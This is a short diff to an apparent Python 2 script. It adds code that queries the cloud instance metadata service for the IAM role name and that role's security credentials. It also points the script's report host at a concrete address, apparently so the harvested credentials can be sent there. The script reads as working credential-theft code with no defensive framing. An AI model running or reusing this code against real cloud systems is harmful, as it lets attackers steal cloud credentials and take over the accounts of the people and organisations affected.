@@ -6,7 +6,7 @@ import urllib2
 import re
 import base64
 
-REPORT_HOST = "http://<reporter_host>:9987"
+REPORT_HOST = "http://10.0.1.226:5000"
 
 
 def report(report):
@@ -42,6 +42,8 @@ def main():
         html = response.read()
         response_payload = json.loads(html)
 
+        response = urllib2.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+        role_name = response.read()
         # Add in the credentials for the role
         response = urllib2.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/%s/' % role_name)
         html = response.read()
